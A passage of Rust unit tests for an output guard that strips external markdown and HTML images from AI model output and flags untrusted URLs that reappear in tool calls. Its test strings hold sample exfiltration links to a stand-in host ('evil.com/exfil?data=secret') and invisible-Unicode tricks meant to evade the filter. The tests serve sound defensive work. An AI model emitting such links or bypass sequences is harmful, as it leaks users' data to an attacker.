            "image usage syntax must be removed: {cleaned}"
        );
        assert!(
            !cleaned.contains("[ref]:"),
            "reference definition must be removed: {cleaned}"
        );
        assert!(!events.is_empty(), "must generate event");
    }

    #[test]
    fn html_img_tag_unquoted_src_blocked() {
        let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: true,
            ..ExfiltrationGuardConfig::default()
        });
        // HTML5 permits unquoted attribute values.
        let (cleaned, events) = guard.scan_output("text <img src=https://evil.com/p.gif> end");
        assert!(
            events
                .iter()
                .any(|e| matches!(e, ExfiltrationEvent::HtmlImageBlocked { url } if url == "https://evil.com/p.gif")),
            "expected HtmlImageBlocked event for unquoted src"
        );
        assert!(
            !cleaned.contains("<img"),
            "img tag must be removed: {cleaned}"
        );
        assert!(
            cleaned.contains("[image removed:"),
            "replacement label must be present: {cleaned}"
        );
    }

    #[test]
    fn empty_alt_text_still_blocked() {
        let text = "![](https://evil.com/p.gif)";
        let (cleaned, events) = guard().scan_output(text);
        // The original markdown image syntax must be removed; the replacement label may contain the URL.
        assert!(
            !cleaned.contains("![]("),
            "markdown image syntax must be removed: {cleaned}"
        );
        assert!(
            cleaned.contains("[image removed:"),
            "replacement label must be present: {cleaned}"
        );
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn html_img_tag_blocked() {
        let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: true,
            ..ExfiltrationGuardConfig::default()
        });
        let (cleaned, events) = guard.scan_output(r#"text <img src="https://evil.com/p.gif"> end"#);
        assert!(
            events
                .iter()
                .any(|e| matches!(e, ExfiltrationEvent::HtmlImageBlocked { .. })),
            "expected HtmlImageBlocked event"
        );
        assert!(
            !cleaned.contains("<img"),
            "img tag must be removed: {cleaned}"
        );
        assert!(
            cleaned.contains("[image removed:"),
            "replacement label must be present: {cleaned}"
        );
    }

    #[test]
    fn html_img_tag_single_quote_blocked() {
        let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: true,
            ..ExfiltrationGuardConfig::default()
        });
        let (cleaned, events) = guard.scan_output("text <img src='https://evil.com/p.gif'> end");
        assert!(
            events
                .iter()
                .any(|e| matches!(e, ExfiltrationEvent::HtmlImageBlocked { .. })),
            "expected HtmlImageBlocked event for single-quoted src"
        );
        assert!(
            !cleaned.contains("<img"),
            "img tag must be removed: {cleaned}"
        );
    }

    #[test]
    fn html_img_tag_noop_when_disabled() {
        let input = r#"text <img src="https://evil.com/p.gif"> end"#;
        let (cleaned, events) = guard_disabled().scan_output(input);
        assert_eq!(cleaned, input);
        assert!(events.is_empty());
    }

    #[test]
    fn unicode_zwj_bypass_blocked() {
        let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: true,
            ..ExfiltrationGuardConfig::default()
        });
        // Insert U+200B (ZWSP) between ! and [ to try to evade markdown regex.
        let input = "!\u{200B}[alt](https://evil.com/track)";
        let (cleaned, _events) = guard.scan_output(input);
        // The bypass sequence `!\u{200B}[` is replaced with `[blocked]`, defusing
        // the markdown image syntax — the `!` prefix that triggers image rendering is gone.
        assert!(
            !cleaned.contains('\u{200B}'),
            "zero-width char must be stripped: {cleaned}"
        );
        assert!(
            !cleaned.starts_with('!'),
            "image trigger `!` must be removed: {cleaned}"
        );
    }

    #[test]
    fn unicode_word_joiner_bypass_blocked() {
        let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: true,
            ..ExfiltrationGuardConfig::default()
        });
        // U+2060 (WORD JOINER) inserted between ! and [ to evade markdown regex.
        let input = "!\u{2060}[alt](https://evil.com/track)";
        let (cleaned, _events) = guard.scan_output(input);
        assert!(
            !cleaned.contains('\u{2060}'),
            "U+2060 word joiner must be stripped: {cleaned}"
        );
        assert!(
            !cleaned.starts_with('!'),
            "image trigger `!` must be removed: {cleaned}"
        );
    }

    #[test]
    fn unicode_bypass_noop_when_disabled() {
        let input = "!\u{200B}[alt](https://evil.com/track)";
        let (cleaned, events) = guard_disabled().scan_output(input);
        assert_eq!(cleaned, input);
        assert!(events.is_empty());
    }

    #[test]
    fn unicode_bidi_override_bypass_blocked() {
        let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: true,
            ..ExfiltrationGuardConfig::default()
        });
        let input = "!\u{202E}[alt](https://evil.com/track)";
        let (cleaned, _events) = guard.scan_output(input);
        assert!(
            !cleaned.contains('\u{202E}'),
            "U+202E BIDI override must be stripped: {cleaned}"
        );
        assert!(
            !cleaned.starts_with('!'),
            "image trigger `!` must be removed: {cleaned}"
        );
    }

    #[test]
    fn unicode_bidi_isolate_bypass_blocked() {
        let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: true,
            ..ExfiltrationGuardConfig::default()
        });
        let input = "!\u{2066}[alt](https://evil.com/track)";
        let (cleaned, _events) = guard.scan_output(input);
        assert!(
            !cleaned.contains('\u{2066}'),
            "U+2066 BIDI isolate must be stripped: {cleaned}"
        );
        assert!(
            !cleaned.starts_with('!'),
            "image trigger `!` must be removed: {cleaned}"
        );
    }

    #[test]
    fn unicode_soft_hyphen_bypass_blocked() {
        let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: true,
            ..ExfiltrationGuardConfig::default()
        });
        let input = "!\u{00AD}[alt](https://evil.com/track)";
        let (cleaned, _events) = guard.scan_output(input);
        assert!(
            !cleaned.contains('\u{00AD}'),
            "U+00AD soft hyphen must be stripped: {cleaned}"
        );
        assert!(
            !cleaned.starts_with('!'),
            "image trigger `!` must be removed: {cleaned}"
        );
    }

    #[test]
    fn unicode_tags_block_bypass_blocked() {
        let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: true,
            ..ExfiltrationGuardConfig::default()
        });
        let input = "!\u{E0041}[alt](https://evil.com/track)";
        let (cleaned, _events) = guard.scan_output(input);
        assert!(
            !cleaned.contains('\u{E0041}'),
            "U+E0041 TAGS char must be stripped: {cleaned}"
        );
        assert!(
            !cleaned.starts_with('!'),
            "image trigger `!` must be removed: {cleaned}"
        );
    }

    #[test]
    fn unicode_cgj_bypass_blocked() {
        let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: true,
            ..ExfiltrationGuardConfig::default()
        });
        // U+034F (CGJ) is category Mn, not Cf — must be covered by explicit addition.
        let input = "!\u{034F}[alt](https://evil.com/track)";
        let (cleaned, _events) = guard.scan_output(input);
        assert!(
            !cleaned.contains('\u{034F}'),
            "U+034F CGJ must be stripped: {cleaned}"
        );
        assert!(
            !cleaned.starts_with('!'),
            "image trigger `!` must be removed: {cleaned}"
        );
    }

    #[test]
    fn unicode_heterogeneous_run_bypass_blocked() {
        let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: true,
            ..ExfiltrationGuardConfig::default()
        });
        // Mixed run: ZWSP + BIDI override + TAGS char — the `+` quantifier must consume all.
        let input = "!\u{200B}\u{202E}\u{E0001}[alt](https://evil.com/track)";
        let (cleaned, _events) = guard.scan_output(input);
        assert!(
            !cleaned.contains('\u{200B}'),
            "U+200B must be stripped in mixed run: {cleaned}"
        );
        assert!(
            !cleaned.contains('\u{202E}'),
            "U+202E must be stripped in mixed run: {cleaned}"
        );
        assert!(
            !cleaned.contains('\u{E0001}'),
            "U+E0001 must be stripped in mixed run: {cleaned}"
        );
        assert!(
            !cleaned.starts_with('!'),
            "image trigger `!` must be removed: {cleaned}"
        );
    }

    #[test]
    fn unicode_bypass_no_false_positive_on_space() {
        let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: true,
            ..ExfiltrationGuardConfig::default()
        });
        // Literal space between `!` and `[` is NOT an invisible bypass char — must not be matched.
        let input = "! [text](https://example.com/)";
        let (cleaned, _events) = guard.scan_output(input);
        assert_eq!(
            cleaned, input,
            "literal space between ! and [ must not trigger bypass detection"
        );
    }

    #[test]
    fn unicode_bypass_no_false_positive_on_clean_image() {
        let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: true,
            ..ExfiltrationGuardConfig::default()
        });
        // Legitimate inline image is handled by Pass 1, not double-processed by Pass 4.
        let (cleaned, events) = guard.scan_output("![alt](https://evil.com/track.gif)");
        assert!(
            events
                .iter()
                .any(|e| matches!(e, ExfiltrationEvent::MarkdownImageBlocked { .. })),
            "should produce MarkdownImageBlocked event, not bypass event"
        );
        assert!(
            !cleaned.contains("![alt]("),
            "clean image must be stripped by Pass 1: {cleaned}"
        );
    }

    #[test]
    fn strips_inline_image_with_uppercase_scheme() {
        let (cleaned, events) = guard().scan_output("Before ![t](HTTPS://evil.com/p.gif) after");
        assert!(
            !cleaned.contains("![t]("),
            "uppercase-scheme image syntax must be removed: {cleaned}"
        );
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn strips_inline_image_with_mixed_case_scheme() {
        let (cleaned, events) = guard().scan_output("Before ![t](Http://evil.com/p.gif) after");
        assert!(
            !cleaned.contains("![t]("),
            "mixed-case-scheme image syntax must be removed: {cleaned}"
        );
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn strips_inline_image_with_scheme_relative_url() {
        let (cleaned, events) = guard().scan_output("Before ![t](//evil.com/p.gif) after");
        assert!(
            !cleaned.contains("![t]("),
            "scheme-relative image syntax must be removed: {cleaned}"
        );
        assert!(
            cleaned.contains("[image removed: //evil.com/p.gif]"),
            "replacement label must contain the scheme-relative url: {cleaned}"
        );
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn strips_html_img_tag_with_scheme_relative_src() {
        let guard = ExfiltrationGuard::new(ExfiltrationGuardConfig {
            block_markdown_images: true,
            ..ExfiltrationGuardConfig::default()
        });
        let (cleaned, events) = guard.scan_output(r#"text <img src="//evil.com/p.gif"> end"#);
        assert!(
            events
                .iter()
                .any(|e| matches!(e, ExfiltrationEvent::HtmlImageBlocked { url } if url == "//evil.com/p.gif")),
            "expected HtmlImageBlocked event for scheme-relative src"
        );
        assert!(
            !cleaned.contains("<img"),
            "img tag must be removed: {cleaned}"
        );
    }

    #[test]
    fn strips_reference_style_image_with_scheme_relative_destination() {
        let text = "Here is the image: ![alt][ref]\n[ref]: //evil.com/track.gif\nend";
        let (cleaned, events) = guard().scan_output(text);
        assert!(
            !cleaned.contains("![alt][ref]"),
            "image usage syntax must be removed: {cleaned}"
        );
        assert!(
            !cleaned.contains("[ref]:"),
            "reference definition must be removed: {cleaned}"
        );
        assert!(!events.is_empty(), "must generate event");
    }

    #[test]
    fn strips_inline_image_with_escaped_quote_in_title() {
        let (cleaned, events) =
            guard().scan_output(r#"Before ![t](https://evil.com/x.gif "a\"b") after"#);
        assert!(
            !cleaned.contains("![t]("),
            "markdown image syntax with escaped-quote title must be removed: {cleaned}"
        );
        assert!(
            cleaned.contains("[image removed: https://evil.com/x.gif]"),
            "replacement label must contain the url without the title: {cleaned}"
        );
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn preserves_plain_relative_path_image() {
        let text = "Look: ![diagram](images/pic.gif) — local";
        let (cleaned, events) = guard().scan_output(text);
        assert_eq!(cleaned, text);
        assert!(events.is_empty());
    }

    #[test]
    fn preserves_relative_path_with_interior_double_slash() {
        // The now-optional scheme requires a literal `//` at the *start* of the destination.
        // A relative path with an interior `//` (not a leading one) must not be misclassified
        // as scheme-relative — the destination here starts with `a`, not `/`.
        let text = "Look: ![diagram](assets//img/pic.gif) — local";
        let (cleaned, events) = guard().scan_output(text);
        assert_eq!(cleaned, text);
        assert!(events.is_empty());
    }

    #[test]
    fn strips_image_with_trailing_backslash_before_title_close() {
        // Title text is `a\` followed by the real closing quote: `"a\")`. The alternation
        // `(?:\\.|[^"])*` first tries to treat `\"` as an escaped quote, which runs past the
        // only closing quote in the string and leaves the title unterminated; the engine then
        // falls back to consuming the lone `\` via the `[^"]` branch instead, stopping right
        // before the real closing `"` and matching it. Net effect: the image IS still stripped
        // — a stricter CommonMark parser would treat this exact input as an unterminated title
        // and not render it as an image at all, so the guard is overzealous here, not
        // permissive. Over-stripping a non-image is safe for an exfiltration guard; documented
        // so a future reader does not mistake this for a bypass.
        let text = r#"Before ![t](https://evil.com/x.gif "a\") after"#;
        let (cleaned, events) = guard().scan_output(text);
        assert!(
            !cleaned.contains("![t]("),
            "markdown image syntax must be removed: {cleaned}"
        );
        assert_eq!(events.len(), 1);
    }

    // --- is_external_url ---

    #[test]
    fn is_external_url_case_insensitive_and_scheme_relative() {
        assert!(is_external_url("https://evil.com/x"));
        assert!(is_external_url("HTTPS://evil.com/x"));
        assert!(is_external_url("Http://evil.com/x"));
        assert!(is_external_url("//evil.com/x"));
        assert!(!is_external_url("images/pic.gif"));
        assert!(!is_external_url("/images/pic.gif"));
        assert!(!is_external_url("data:image/png;base64,abc"));
    }

    // --- validate_tool_call ---

    #[test]
    fn detects_flagged_url_in_json_string() {
        // Build the flagged set the way a `flagged_urls`-specific caller does: raw extraction
        // followed by explicit normalization (see `build_flagged_set`).
        let flagged = build_flagged_set("https://evil.com/payload");
        let args = r#"{"url": "https://evil.com/payload"}"#;
        let events = guard().validate_tool_call("fetch", args, &flagged);
        assert_eq!(events.len(), 1);
        assert!(
            matches!(&events[0], ExfiltrationEvent::SuspiciousToolUrl { url, tool_name }
            if url == "https://evil.com/payload" && tool_name == "fetch")
        );
    }

    #[test]
    fn scheme_relative_flag_matches_explicit_scheme_tool_arg() {
        // Flagged via scheme-relative extraction from untrusted output; matched against an
        // explicit-scheme occurrence of the same URL in a later tool-call argument.
        let flagged = build_flagged_set("suspicious link: //evil.com/exfil?data=secret");
        let args = r#"{"url": "https://evil.com/exfil?data=secret"}"#;
        let events = guard().validate_tool_call("fetch", args, &flagged);
        assert_eq!(
            events.len(),
            1,
            "scheme-relative flag must match explicit-scheme tool arg"
        );
        assert!(
            matches!(&events[0], ExfiltrationEvent::SuspiciousToolUrl { url, .. }
            if url == "https://evil.com/exfil?data=secret"),
            "raw (non-normalized) url must be preserved in the event"
        );
    }

    #[test]
    fn explicit_scheme_flag_matches_scheme_relative_tool_arg() {
        // Flagged via explicit-scheme extraction from untrusted output; matched against a
        // scheme-relative occurrence of the same URL in a later tool-call argument.
        let flagged = build_flagged_set("suspicious link: https://evil.com/exfil2?data=secret");
        let args = r#"{"url": "//evil.com/exfil2?data=secret"}"#;
        let events = guard().validate_tool_call("fetch", args, &flagged);
        assert_eq!(
            events.len(),
            1,
            "explicit-scheme flag must match scheme-relative tool arg"
        );
        assert!(
            matches!(&events[0], ExfiltrationEvent::SuspiciousToolUrl { url, .. }
            if url == "//evil.com/exfil2?data=secret"),
            "raw (non-normalized) url must be preserved in the event"
        );
    }

    #[test]
    fn no_event_when_url_not_flagged() {
        let mut flagged = HashSet::new();
        flagged.insert("https://other.com/benign".to_owned());
        let args = r#"{"url": "https://legitimate.com/page"}"#;
        let events = guard().validate_tool_call("fetch", args, &flagged);
        assert!(events.is_empty());
    }

    #[test]
    fn validate_tool_call_noop_when_disabled() {
        let mut flagged = HashSet::new();
        flagged.insert("https://evil.com/x".to_owned());
        let args = r#"{"url": "https://evil.com/x"}"#;
        let events = guard_disabled().validate_tool_call("fetch", args, &flagged);
        assert!(events.is_empty());
    }

    #[test]
    fn validate_tool_call_noop_with_empty_flagged() {
        let args = r#"{"url": "https://evil.com/x"}"#;
        let events = guard().validate_tool_call("fetch", args, &HashSet::new());
        assert!(events.is_empty());
    }

    #[test]
    fn extracts_urls_from_nested_json() {
        let flagged = build_flagged_set("https://evil.com/deep");
        let args = r#"{"nested": {"inner": ["https://evil.com/deep"]}}"#;
        let events = guard().validate_tool_call("tool", args, &flagged);
        assert_eq!(events.len(), 1);
    }

    #[test]
    fn handles_escaped_slashes_in_json() {
        // JSON-encoded URL with escaped forward slashes should still be detected
        // after serde_json parsing (which unescapes the string value).
        let flagged = build_flagged_set("https://evil.com/path");
        // serde_json will unescape \/ → /
        let args = r#"{"url": "https:\/\/evil.com\/path"}"#;
        let parsed: serde_json::Value = serde_json::from_str(args).unwrap();
        // Confirm serde_json unescapes it.
        assert_eq!(parsed["url"], "https://evil.com/path");
        let events = guard().validate_tool_call("fetch", args, &flagged);
        assert_eq!(events.len(), 1, "JSON-escaped URL must be caught");
    }

    // --- should_guard_memory_write ---

    #[test]
    fn guards_when_injection_flags_set() {
        let event = guard().should_guard_memory_write(true);
        assert!(event.is_some());
        assert_matches!(event.unwrap(), ExfiltrationEvent::MemoryWriteGuarded { .. });
    }

    #[test]
    fn passes_when_no_injection_flags() {
        let event = guard().should_guard_memory_write(false);
        assert!(event.is_none());
    }

    #[test]
    fn guard_memory_write_noop_when_disabled() {
        let event = guard_disabled().should_guard_memory_write(true);
        assert!(event.is_none());
    }

    // --- percent_decode_url ---

    #[test]
    fn percent_decode_roundtrip() {
        assert_eq!(
            percent_decode_url("https://example.com"),
            "https://example.com"
        );
        assert_eq!(
            percent_decode_url("%68ttps://example.com"),
            "https://example.com"
        );
        assert_eq!(percent_decode_url("hello%20world"), "hello world");
    }

    // --- extract_flagged_urls ---

    #[test]
    fn extracts_urls_from_plain_text() {
        let content = "check https://evil.com/x and https://other.com/y for details";
        let urls = extract_flagged_urls(content);
        assert!(urls.contains("https://evil.com/x"));
        assert!(urls.contains("https://other.com/y"));
    }

    #[test]
    fn extracts_scheme_relative_urls_from_plain_text_raw() {
        // extract_flagged_urls returns raw, non-normalized text — a scheme-relative match
        // stays scheme-relative in the returned set (normalization is an opt-in step for
        // callers building a `flagged_urls`-style matching set, not automatic here).
        let content = "check //evil.com/x for details";
        let urls = extract_flagged_urls(content);
        assert!(urls.contains("//evil.com/x"));
    }

    #[test]
    fn extract_flagged_urls_does_not_collapse_explicit_and_scheme_relative_forms() {
        // Unlike a normalized `flagged_urls`-style set, extract_flagged_urls's raw output keeps
        // both textual forms of the same origin as distinct entries — callers that need exact
        // text fidelity (e.g. URL-grounding checks against user-supplied input) depend on this.
        let urls = extract_flagged_urls("https://evil.com/x and //evil.com/x again");
        assert_eq!(
            urls.len(),
            2,
            "raw output must keep both forms distinct: {urls:?}"
        );
        assert!(urls.contains("https://evil.com/x"));
        assert!(urls.contains("//evil.com/x"));
    }

    #[test]
    fn build_flagged_set_normalizes_explicit_and_scheme_relative_to_same_entry() {
        // The `flagged_urls`-style construction path (raw extraction + explicit
        // normalize_url_for_matching, as `build_flagged_set` models) must collapse both
        // textual forms of the same origin into a single matchable entry — otherwise the
        // exact-string `flagged_urls` set would miss the cross-form match. This is the
        // direct regression test for #6519.
        let urls = build_flagged_set("https://evil.com/x and //evil.com/x again");
        assert_eq!(
            urls.len(),
            1,
            "both forms must normalize to the same entry: {urls:?}"
        );
        assert!(urls.contains("//evil.com/x"));
    }

    // --- normalize_url_for_matching ---

    #[test]
    fn normalize_url_for_matching_strips_scheme_case_insensitively() {
        assert_eq!(
            normalize_url_for_matching("https://evil.com/x"),
            "//evil.com/x"
        );
        assert_eq!(
            normalize_url_for_matching("HTTPS://evil.com/x"),
            "//evil.com/x"
        );
        assert_eq!(
            normalize_url_for_matching("http://evil.com/x"),
            "//evil.com/x"
        );
        assert_eq!(
            normalize_url_for_matching("Http://evil.com/x"),
            "//evil.com/x"
        );
        assert_eq!(normalize_url_for_matching("//evil.com/x"), "//evil.com/x");
    }

    // --- collect_strings depth guard ---

    /// Wraps `leaf` in `depth` nested single-element arrays, e.g. `[[["leaf"]]]`.
    fn nested_array(depth: usize, leaf: &str) -> serde_json::Value {
        let mut v = serde_json::json!(leaf);
        for _ in 0..depth {
            v = serde_json::Value::Array(vec![v]);
        }
        v
    }

    #[test]
    fn collect_strings_adversarial_scale_does_not_crash() {
        // Attacker-scale nesting, far beyond MAX_JSON_DEPTH, built programmatically to
        // bypass serde_json's own parse-time recursion limit — must not overflow the
        // stack; the depth guard caps real recursion depth regardless of input nesting.
        let value = nested_array(10_000, "deep");
        let mut out = Vec::new();
        collect_strings(&value, &mut out, 0);
        assert!(out.is_empty());
    }

    #[test]
    fn collect_strings_exact_depth_boundary() {
        let just_inside = nested_array(MAX_JSON_DEPTH - 1, "just_inside");
        let mut out = Vec::new();
        collect_strings(&just_inside, &mut out, 0);
        assert_eq!(out, vec!["just_inside"]);

        let just_outside = nested_array(MAX_JSON_DEPTH, "just_outside");
        let mut out = Vec::new();
        collect_strings(&just_outside, &mut out, 0);
        assert!(out.is_empty());
    }
}
